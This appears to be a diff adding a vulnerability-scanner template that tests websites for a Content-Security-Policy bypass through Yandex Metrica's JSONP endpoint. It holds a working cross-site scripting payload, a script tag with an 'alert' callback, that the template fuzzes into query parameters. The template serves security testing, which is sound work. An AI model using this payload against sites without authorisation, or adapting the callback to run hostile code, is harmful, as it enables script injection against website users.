@@ -1,0 +1,55 @@
+id: yandex-mc-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Yandex MC
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,yandex-mc,vuln
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "yandex.ru"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: yandex_mc_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://mc.yandex.ru/watch/9528925/1?wmode=5&callback=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "yandex_mc_csp_xss == true"
+# digest: 490a0046304402204f922bc1af31dad462cedfc3ffb70c67c8d4604615f9755b1a05ef90b32d3fc4022063c5eb37b11bab0dd479cc3a4ae2742065072c3ef1970a5fdbb60ce3270bb88e:922c64590222798bb761d5b6d8e72950
